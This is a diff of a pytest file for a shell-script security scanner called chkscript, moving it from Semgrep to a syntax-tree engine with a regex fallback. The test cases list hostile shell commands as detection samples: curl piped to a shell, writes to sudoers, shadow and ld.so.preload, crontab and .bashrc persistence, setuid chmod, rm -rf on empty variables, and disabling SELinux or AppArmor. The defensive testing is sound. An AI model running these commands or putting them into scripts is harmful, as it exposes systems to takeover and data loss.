@@ -1,21 +1,20 @@
-"""One snippet per rule behaviour, run through both Semgrep and the regex rules.
+"""One snippet per rule behaviour, run through the syntax-tree rules and the
+regex fallback.
 
-Both engines must agree on every case: the regex fallback is only a floor if it
-fires where Semgrep would.
+CASES must come out the same under both engines. TREE_CASES are where the
+syntax tree knows better (a heredoc is data, a variable is a constant) and the
+regex rules over-report by design; those check the tree engine's answer and
+that the regex rules still fire. The fallback may over-flag, never under-flag:
+test_engine_findings_are_a_subset_of_regex checks that on every snippet here.
 """
 
 from __future__ import annotations
-
-import functools
-import re
-from collections.abc import Callable
-from importlib import resources
 
 import pytest
 
 from chkscript.models import Finding, ScriptBundle
 from chkscript.preprocess import preprocess
-from chkscript.static import regex_rules, semgrep
+from chkscript.static import engine, regex_rules, rules
 from tests.conftest import require_tool
 from tests.test_rule_spans import CASES as SPAN_CASES
 
@@ -26,6 +25,9 @@ CASES: list[tuple[str, str, bool]] = [
     ("curl-pipe-shell", "curl -s https://x.example/i | tee /tmp/l | zsh", True),
     ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh -o i.sh", False),
     ("curl-pipe-shell", "# curl https://x.example/i.sh | sh", False),
+    ("curl-pipe-shell", "c=curl\n$c -fsSL https://x.example/i.sh | sh", True),
+    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh | $SH", True),
+    ("curl-pipe-shell", "bash -c 'curl -fsSL https://x.example | sh'", True),
     ("eval-dynamic", 'eval "$cmd"', True),
     ("eval-dynamic", "eval $(echo hi)", True),
     ("eval-dynamic", 'eval "echo $X"', True),
@@ -41,9 +43,11 @@ CASES: list[tuple[str, str, bool]] = [
     ("write-system-auth-file", "echo x | sudo tee /etc/sudoers.d/x", True),
     ("write-system-auth-file", "echo /tmp/x.so > /etc/ld.so.preload", True),
     ("write-system-auth-file", "cp shadow.bak /etc/shadow", True),
+    ("write-system-auth-file", 'echo x | sudo tee "/etc/sudoers.d/$NAME"', True),
     ("write-system-auth-file", "grep root /etc/passwd", False),
     ("persistence-append", "echo 'export X=1' >> ~/.bashrc", True),
     ("persistence-append", 'echo "run" >> "$HOME/.zshrc"', True),
+    ("persistence-append", "echo x | sudo tee -a ~/.profile", True),
     ("persistence-append", "(crontab -l; echo '* * * * * /tmp/x') | crontab -", True),
     ("persistence-append", "cp x.service /etc/systemd/system/x.service", True),
     ("persistence-append", "crontab -l", False),
@@ -52,16 +56,19 @@ CASES: list[tuple[str, str, bool]] = [
     ("insecure-permissions", "chmod +s /usr/local/bin/tool", True),
     ("insecure-permissions", "chmod 4755 /usr/local/bin/tool", True),
     ("insecure-permissions", 'chown root:root "$HOME/bin/tool"', True),
+    ("insecure-permissions", "sudo chmod -R 777 /opt/x", True),
     ("insecure-permissions", "chmod 755 /usr/local/bin/tool", False),
     ("insecure-permissions", "chown root:root /usr/local/bin/tool", False),
     ("rm-rf-variable", 'rm -rf "$DIR/"', True),
     ("rm-rf-variable", "rm -fr ${PREFIX}/lib", True),
     ("rm-rf-variable", 'rm -r -f "$TMP"', True),
+    ("rm-rf-variable", 'DIR=\nrm -rf "$DIR/"', True),
     ("rm-rf-variable", "rm -rf /tmp/build", False),
     ("rm-rf-variable", 'rm -f "$TMP/x"', False),
     ("disable-security", "setenforce 0", True),
     ("disable-security", "ufw disable", True),
     ("disable-security", "systemctl disable --now apparmor", True),
+    ("disable-security", "sudo systemctl disable --now cups apparmor", True),
     ("disable-security", "systemctl disable cups", False),
     ("http-download", "curl -o f http://example.com/f", True),
     ("http-download", "wget http://example.com/f.tar.gz", True),
@@ -94,7 +101,27 @@ CASES: list[tuple[str, str, bool]] = [
         False,
     ),
     ("unverified-download", "chmod +x ./build.sh", False),
-    # Backslash continuations: both engines scan joined logical lines.
+    # Per downloaded file: verifying one download does not cover another.
+    (
+        "unverified-download",
+        "curl -o /tmp/a https://x.example/a\ncurl -o /tmp/b https://x.example/b\n"
+        "sha256sum /tmp/a\nchmod +x /tmp/b",
+        True,
+    ),
+    (
+        "unverified-download",
+        "curl -o /tmp/a https://x.example/a\ncurl -o /tmp/b https://x.example/b\n"
+        "sha256sum /tmp/a\nchmod +x /tmp/a",
+        False,
+    ),
+    # Tied through an archive: download $exe.zip, unzip, chmod $exe.
+    (
+        "unverified-download",
+        'curl -o "$exe.zip" https://x.example/t.zip\nunzip "$exe.zip"\n'
+        'chmod +x "$exe"',
+        True,
+    ),
+    # Backslash continuations: both engines see the command on its first line.
     ("rm-rf-variable", 'rm -rf \\\n  "$DIR"', True),
     ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh \\\n  | sh", True),
     ("curl-pipe-shell", "cu\\\nrl -fsSL https://x.example/i.sh | sh", True),
@@ -102,11 +129,33 @@ CASES: list[tuple[str, str, bool]] = [
     ("rm-rf-variable", '# clean up \\\nrm -rf "$DIR"', True),
 ]
 
-
-# Where the engines knowingly differ: the regex rules cannot tell a command from
-# the same text inside a quoted string, so they over-report. Over-reporting is
-# the acceptable direction for a fallback floor.
-STRING_LITERAL = 'echo "run: curl https://x.example/i.sh | sh"'
+# (rule id, script body, does the syntax-tree engine fire): the regex rules
+# fire on every one of these.
+TREE_CASES: list[tuple[str, str, bool]] = [
+    # Text inside a string or a printed heredoc is data.
+    ("curl-pipe-shell", 'echo "run: curl https://x.example/i.sh | sh"', False),
+    ("curl-pipe-shell", "cat <<EOF\ncurl https://x.example/i.sh | sh\nEOF", False),
+    ("eval-dynamic", 'cat <<EOS\n  eval "$(brew shellenv)"\nEOS', False),
+    # A heredoc fed to a shell is code, reported on its own line.
+    ("rm-rf-variable", 'sh <<EOF\nrm -rf "$X"\nEOF', True),
+    # `| sudo tee` writes a file; it does not run the download.
+    ("curl-pipe-shell", "curl -fsSL https://x.example/k | sudo tee /etc/k", False),
+    # A constant path is not a variable that can be empty.
+    ("rm-rf-variable", 'DIR=/opt/x\nrm -rf "$DIR/"', False),
+    # The chmod'ed file is not the download.
+    (
+        "unverified-download",
+        "curl -o /tmp/t https://x.example/t\nchmod +x ./build.sh",
+        False,
+    ),
+    # A function that downloads its arguments is followed to the call.
+    (
+        "unverified-download",
+        'dl() {\n  curl -fsSL -o "$2" "$1"\n}\ndl https://x.example/t /tmp/t\n'
+        "chmod +x /tmp/t",
+        True,
+    ),
+]
 
 
 def _bundle(body: str) -> ScriptBundle:
@@ -114,83 +163,77 @@ def _bundle(body: str) -> ScriptBundle:
 
 
 def _rule_ids(findings: list[Finding]) -> set[str]:
-    return {f.rule_id for f in findings if f.rule_id is not None}
+    return {f.rule_id for f in findings if f.rule_id in rules.RULE_IDS}
+
+
+def _tree(bundle: ScriptBundle) -> list[Finding]:
+    require_tool("shfmt")
+    outcome = engine.scan(bundle)
+    assert outcome.parsed, f"shfmt did not parse: {bundle.text!r}"
+    return outcome.findings
 
 
 def _regex(bundle: ScriptBundle) -> list[Finding]:
     return regex_rules.run(bundle)
 
 
-@functools.cache
-def _semgrep_cached(text: str) -> tuple[bool, tuple[Finding, ...]]:
-    # One Semgrep run per distinct script, shared by test_rule and the parity test.
-    outcome = semgrep.run(preprocess(text.encode()))
-    return outcome.complete, tuple(outcome.findings)
+def _ids(cases: list[tuple[str, str, bool]]) -> list[str]:
+    return [f"{r}-{i}-{'hit' if f else 'miss'}" for i, (r, _, f) in enumerate(cases)]
 
 
-def _semgrep(bundle: ScriptBundle) -> list[Finding]:
-    require_tool("semgrep")
-    complete, findings = _semgrep_cached(bundle.text)
-    assert complete, f"Semgrep did not fully parse: {bundle.text!r}"
-    return list(findings)
+@pytest.mark.parametrize("engine_name", ["shfmt", "regex"])
+@pytest.mark.parametrize(("rule_id", "body", "fires"), CASES, ids=_ids(CASES))
+def test_rule(engine_name: str, rule_id: str, body: str, fires: bool) -> None:
+    run = _tree if engine_name == "shfmt" else _regex
+    assert (rule_id in _rule_ids(run(_bundle(body)))) is fires
 
 
-ENGINES: dict[str, Callable[[ScriptBundle], list[Finding]]] = {
-    "regex": _regex,
-    "semgrep": _semgrep,
-}
-
-
-@pytest.mark.parametrize("engine", sorted(ENGINES))
-@pytest.mark.parametrize(
-    ("rule_id", "body", "fires"),
-    CASES,
-    ids=[f"{r}-{i}-{'hit' if f else 'miss'}" for i, (r, _, f) in enumerate(CASES)],
-)
-def test_rule(engine: str, rule_id: str, body: str, fires: bool) -> None:
-    ids = _rule_ids(ENGINES[engine](_bundle(body)))
-    assert (rule_id in ids) is fires
-
-
-PARITY_BODIES = sorted(
-    {body for _, body, _ in CASES} | {body for _, body in SPAN_CASES}
-)
-
-
-@pytest.mark.parametrize("body", PARITY_BODIES, ids=lambda body: repr(body)[:40])
-def test_engines_agree(body: str) -> None:
-    """Semgrep and the regex fallback return the same rule ids on every case.
-
-    test_rule checks each engine only for its target rule; this compares
-    everything either one reports, which is what catches a rule that misfires
-    under one engine only. The two-line span cases are included because the
-    NIM-98 bug (Semgrep regexes matching across lines) shows only when two
-    lines sit next to each other.
-    """
+@pytest.mark.parametrize(("rule_id", "body", "fires"), TREE_CASES, ids=_ids(TREE_CASES))
+def test_tree_rule(rule_id: str, body: str, fires: bool) -> None:
     bundle = _bundle(body)
-    assert _rule_ids(_semgrep(bundle)) == _rule_ids(_regex(bundle))
+    assert (rule_id in _rule_ids(_tree(bundle))) is fires
+    assert rule_id in _rule_ids(_regex(bundle)), "the fallback must over-report"
 
 
-def test_semgrep_ignores_command_text_inside_strings() -> None:
-    assert "curl-pipe-shell" not in _rule_ids(_semgrep(_bundle(STRING_LITERAL)))
+ALL_BODIES = sorted(
+    {body for _, body, _ in CASES}
+    | {body for _, body, _ in TREE_CASES}
+    | {body for _, body in SPAN_CASES}
+)
 
 
-def test_regex_over_reports_command_text_inside_strings() -> None:
-    assert "curl-pipe-shell" in _rule_ids(_regex(_bundle(STRING_LITERAL)))
+@pytest.mark.parametrize("body", ALL_BODIES, ids=lambda body: repr(body)[:40])
+def test_engine_findings_are_a_subset_of_regex(body: str) -> None:
+    """Every (rule, line) the tree engine reports, the regex rules report too."""
+    bundle = _bundle(body)
+    tree = {(f.rule_id, f.line) for f in _tree(bundle)}
+    regex = {(f.rule_id, f.line) for f in _regex(bundle)}
+    assert tree <= regex
 
 
-def _yaml_rules() -> dict[str, str]:
-    """Rule id -> message from the shipped YAML, without a YAML dependency."""
-    text = (resources.files("chkscript") / "rules" / "chkscript.yml").read_text()
-    pairs = re.findall(r"^\s*- id: (\S+)\n(?:.*\n)*?\s*message: (.+)$", text, re.M)
-    return dict(pairs)
+def test_every_rule_has_a_hit_and_a_miss() -> None:
+    for rule_id in rules.RULE_IDS:
+        outcomes = {fires for r, _, fires in CASES if r == rule_id}
+        assert outcomes == {True, False}, rule_id
 
 
-def test_regex_rules_mirror_semgrep_rules() -> None:
-    yaml_rules = _yaml_rules()
-    assert set(yaml_rules) == regex_rules.RULE_IDS
-    regex_messages = {
-        rule.rule_id: rule.message
-        for rule in (*regex_rules.LINE_RULES, regex_rules.UNVERIFIED_DOWNLOAD)
+def test_engines_share_rule_ids_and_messages() -> None:
+    regex_ids = {
+        r.rule_id for r in (*regex_rules.LINE_RULES, regex_rules.UNVERIFIED_DOWNLOAD)
     }
-    assert regex_messages == yaml_rules
+    assert regex_ids == rules.RULE_IDS
+    for rule in (*regex_rules.LINE_RULES, regex_rules.UNVERIFIED_DOWNLOAD):
+        assert rule.message == rules.MESSAGES[rule.rule_id]
+
+
+def test_tree_findings_use_source_shfmt() -> None:
+    [finding] = _tree(_bundle("curl -fsSL https://x.example/i.sh | sh"))
+    assert finding.source == "shfmt"
+    assert finding.line == 2
+    assert finding.description == rules.MESSAGES["curl-pipe-shell"]
+
+
+def test_unparseable_embedded_code_falls_back_to_regex() -> None:
+    findings = _tree(_bundle("bash -c 'if then (( curl x | sh'"))
+    pipe = [f for f in findings if f.rule_id == "curl-pipe-shell"]
+    assert [(f.source, f.line) for f in pipe] == [("regex", 2)]
